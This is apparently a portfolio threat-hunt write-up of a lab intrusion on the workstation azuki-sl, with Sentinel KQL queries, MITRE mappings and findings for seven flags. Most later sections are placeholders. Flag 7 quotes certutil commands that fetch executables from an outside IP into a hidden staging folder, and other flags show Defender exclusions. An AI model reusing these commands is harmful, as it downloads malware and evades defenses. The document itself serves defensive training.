<p align="center">
  <img
    src="https://github.com/user-attachments/assets/337bb215-8833-4653-b570-93c443bd9c11"
    width="1200"
    alt="Threat Hunt Cover Image"
  />
</p>




# 🛡️ Threat Hunt Report – Port of Entry

---

## 📌 Executive Summary

Competitor undercut our 6-year shipping contract by exactly 3%. Our supplier contracts and pricing data appeared on underground forums.

---

## 🎯 Hunt Objectives

- Detect suspicious activity in endpoint and network data
- Map attacker actions to MITRE ATT&CK framework
- Record findings, blind spots, and ways to improve response

---

## 🧭 Scope & Environment

- **Compromised System:** `azuki-sl` (IT admin workstation) 
- **Data Sources:** Microsoft Sentinel Logs Analytics Workspace
- **Timeframe:** <2025-11-19 → 2025-11-20>  

---

## 📚 Table of Contents

- [🧠 Hunt Overview](#-hunt-overview)
- [🧬 MITRE ATT&CK Summary](#-mitre-attck-summary)
- [🔍 Flag Analysis](#-flag-analysis)
  - [🚩 Flag 1](#-flag-1)
  - [🚩 Flag 2](#-flag-2)
  - [🚩 Flag 3](#-flag-3)
  - [🚩 Flag 4](#-flag-4)
  - [🚩 Flag 5](#-flag-5)
  - [🚩 Flag 6](#-flag-6)
  - [🚩 Flag 7](#-flag-7)
  - [🚩 Flag 8](#-flag-8)
  - [🚩 Flag 9](#-flag-9)
  - [🚩 Flag 10](#-flag-10)
  - [🚩 Flag 11](#-flag-11)
  - [🚩 Flag 12](#-flag-12)
  - [🚩 Flag 13](#-flag-13)
  - [🚩 Flag 14](#-flag-14)
  - [🚩 Flag 15](#-flag-15)
  - [🚩 Flag 16](#-flag-16)
  - [🚩 Flag 17](#-flag-17)
  - [🚩 Flag 18](#-flag-18)
  - [🚩 Flag 19](#-flag-19)
  - [🚩 Flag 20](#-flag-20)
- [🚨 Detection Gaps & Recommendations](#-detection-gaps--recommendations)
- [🧾 Final Assessment](#-final-assessment)
- [📎 Analyst Notes](#-analyst-notes)

---

## 🧠 Hunt Overview

<High-level narrative describing the attack lifecycle, key behaviors observed, and why this hunt matters.>

---

## 🧬 MITRE ATT&CK Summary

| Flag | Technique Category | MITRE ID | Priority |
|-----:|-------------------|----------|----------|
| 1 | Remote Services | T1021.001 | <Placeholder> |
| 2 | Remote Services | T1021.001 | <Placeholder> |
| 3 | System Network Configuration Discovery | T1016 | <Placeholder> |
| 4 | Malware Staging Directory | T1074.001 | <Placeholder> |
| 5 | Impair Defenses: Disable or Modify Tools | T1562.001 | <Placeholder> |
| 6 | Impair Defenses: Disable or Modify Tools | T1562.001 | <Placeholder> |
| 7 | Masquerading: Match Legitimate Resource Name or Location | T1036.005 | <Placeholder> |
| 8 | <Placeholder> | <Placeholder> | <Placeholder> |
| 9 | <Placeholder> | <Placeholder> | <Placeholder> |
| 10 | <Placeholder> | <Placeholder> | <Placeholder> |
| 11 | <Placeholder> | <Placeholder> | <Placeholder> |
| 12 | <Placeholder> | <Placeholder> | <Placeholder> |
| 13 | <Placeholder> | <Placeholder> | <Placeholder> |
| 14 | <Placeholder> | <Placeholder> | <Placeholder> |
| 15 | <Placeholder> | <Placeholder> | <Placeholder> |
| 16 | <Placeholder> | <Placeholder> | <Placeholder> |
| 17 | <Placeholder> | <Placeholder> | <Placeholder> |
| 18 | <Placeholder> | <Placeholder> | <Placeholder> |
| 19 | <Placeholder> | <Placeholder> | <Placeholder> |
| 20 | <Placeholder> | <Placeholder> | <Placeholder> |

---

## 🔍 Flag Analysis

_All flags below are collapsible for readability._

---

<details>
<summary id="-flag-1">🚩 <strong>Flag 1: Remote Services </strong></summary>

### 🎯 Objective
Find the source IP address of the Remote Desktop Protocol Connection 
### 📌 Finding
IP Address of the attacker is 88.97.178.12

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-sl |
| Timestamp | 11/19/2025, 6:36:21.026 PM |
| Process | Remote Desktop Protocol |
| Attacker IP | 88.97.178.12 |

### 💡 Why it matters
RDP connections create network logs that show where unauthorized access came from. Identifying the source helps figure out who the attacker is and stop active attacks

### 🔧 KQL Query Used
``` kql
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where LogonType  has "Unlock"
| project TimeGenerated, AccountDomain, AccountName, ActionType, LogonType, RemoteIP, RemoteIPType
```

### 🖼️ Screenshot
<img width="1573" height="871" alt="image" src="https://github.com/user-attachments/assets/f0020aa8-6265-44f0-86cb-d749b4b9b475" />

</details>

---

<details>
<summary id="-flag-2">🚩 <strong>Flag 2: Remote Services</strong></summary>

### 🎯 Objective
Identify the compromised user account that was used for initial access
### 📌 Finding
The user account is kenji.sato
### 🔍 Evidence

| Field | Value |
|------|-------|
| Username | kenji.sato |
| Timestamp | 11/19/2025, 6:36:21.026 PM |
| Process | Remote Desktop Protocol |
| Attacker IP | `88.97.178.12` |

### 💡 Why it matters
Discovering the user account that is compromised can lead us the through the trail of the attack

### 🔧 KQL Query Used
``` kql
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where LogonType  has "Unlock"
| project TimeGenerated, AccountDomain, AccountName, ActionType, LogonType, RemoteIP, RemoteIPType

```

### 🖼️ Screenshot
<img width="1573" height="875" alt="image" src="https://github.com/user-attachments/assets/e03c5b5b-bbdb-4677-9b5f-c58c6b411a0c" />

</details>

---

<details>
<summary id="-flag-3">🚩 <strong>Flag 3: Network Reconnaissance</strong></summary>

### 🎯 Objective
Identify the command and argument used to enumerate network neighbours
### 📌 Finding
The command was "ARP.EXE" -a
### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 11/19/2025, 7:04:01.773 PM |
| Process | `arp.exe` |
| Command | `"ARP.EXE" -a` |

### 💡 Why it matters
Attackers scan networks to find spread paths and critical assets. This reconnaissance signals advanced persistent threats.


### 🔧 KQL Query Used
``` kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine contains "arp"
| project TimeGenerated, AccountDomain, AccountName, ProcessCommandLine

```

### 🖼️ Screenshot
<img width="1566" height="880" alt="image" src="https://github.com/user-attachments/assets/6e1b67af-4889-491a-8952-39e11a2ec1ab" />

</details>

---

<details>
<summary id="-flag-4">🚩 <strong>Flag 4: Malware Staging Directory</strong></summary>

### 🎯 Objective
Identify the primary staging directory where malware was stored
### 📌 Finding
C:\ProgramData\WindowsCache
### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 11/19/2025, 7:05:33.766 PM |
| Process | `attrib.exe` |
| Command | `"attrib.exe" +h +s C:\ProgramData\WindowsCache` |
| Directory | `C:\ProgramData\WindowsCache` |

### 💡 Why it matters
Adversaries create staging directories for tool deployment and data aggregation. Locating these paths exposes compromise scope and residual threat artifacts.


### 🔧 KQL Query Used
``` kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine contains "arp"
| project TimeGenerated, AccountDomain, AccountName, ProcessCommandLine

```

### 🖼️ Screenshot
<img width="1579" height="880" alt="image" src="https://github.com/user-attachments/assets/157d97d5-a8b8-497e-9e28-5664de6fe78c" />

</details>

---

<details>
<summary id="-flag-5">🚩 <strong>Flag 5: File Extension Exclusions</strong></summary>

### 🎯 Objective
Identify the amount of file extensions that were excluded from Windows Defender
### 📌 Finding
3 file extensions were excluded from Windows Defender. The 3 extensions were `.exe`, `.psi`, and `.bat`.
### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 11/19/2025, 7:05:33.766 PM |
| Extensions Excluded | `.exe`, `.psi`, and `.bat`. |
| Registry Key | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions` |

### 💡 Why it matters
Attackers exclude file types from Windows Defender to avoid detection. The number of exclusions indicates their evasion strategy.


### 🔧 KQL Query Used
``` kql
DeviceRegistryEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where RegistryValueName has "." and RegistryKey has "Extensions"
| project TimeGenerated, ActionType, DeviceName, RegistryValueName, RegistryKey

```

### 🖼️ Screenshot
<img width="1574" height="880" alt="image" src="https://github.com/user-attachments/assets/40d1d7cc-b515-4d78-a2e3-ddfc73123409" />

</details>

---

<details>
<summary id="-flag-6">🚩 <strong>Flag 6: Temporary Folder Exclusion</strong></summary>

### 🎯 Objective
Identify the temporary folder path was excluded from Windows Defender scanning
### 📌 Finding
C:\Users\KENJI~1.SAT\AppData\Local\Temp
### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 11/19/2025, 6:49:27.683 PM |
| Directory | `C:\Users\KENJI~1.SAT\AppData\Local\Temp` |
| Registry Key | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths` |

### 💡 Why it matters
Attackers exclude folders from Windows Defender to avoid detection of directories used for downloading and executing malicious tools. The exclusions let malware run undetected.


### 🔧 KQL Query Used
``` kql
DeviceRegistryEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where RegistryValueName has "." and RegistryKey has "Paths"
| project TimeGenerated, ActionType, DeviceName, RegistryValueName, RegistryKey

```

### 🖼️ Screenshot
<img width="1574" height="879" alt="image" src="https://github.com/user-attachments/assets/7365f225-2e37-411d-9d7d-23fba8a12a41" />

</details>

---

<details>
<summary id="-flag-7">🚩 <strong>Flag 7: Download Utility Abuse</strong></summary>

### 🎯 Objective
Identify the Windows-native binary the attacker abused to download files
### 📌 Finding
certutil.exe
### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 11/19/2025, 6:49:27.683 PM |
| Binary | `certutil.exe` |
| Cmd 1 | `"certutil.exe" -urlcache -f http://78.141.196.6:8080/svchost.exe C:\ProgramData\WindowsCache\svchost.exe` |
| Cmd 2 | `"certutil.exe" -urlcache -f http://78.141.196.6:8080/AdobeGC.exe C:\ProgramData\WindowsCache\mm.exe` |

### 💡 Why it matters
Attackers weaponize native system tools to download malware undetected. Recognizing these methods improves security controls.


### 🔧 KQL Query Used
``` kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine has_all ("http", "WindowsCache")
| project TimeGenerated, DeviceName, FileName, FolderPath, ProcessCommandLine

```

### 🖼️ Screenshot
<img width="1570" height="880" alt="image" src="https://github.com/user-attachments/assets/83ac78a7-c78a-47e5-8dcc-24db416b35ca" />

</details>

---

## 🚨 Detection Gaps & Recommendations

### Observed Gaps
- <Placeholder>
- <Placeholder>
- <Placeholder>

### Recommendations
- <Placeholder>
- <Placeholder>
- <Placeholder>

---

## 🧾 Final Assessment

<Concise executive-style conclusion summarizing risk, attacker sophistication, and defensive posture.>

---

## 📎 Analyst Notes

- Report structured for interview and portfolio review  
- Evidence reproducible via advanced hunting  
- Techniques mapped directly to MITRE ATT&CK  

---
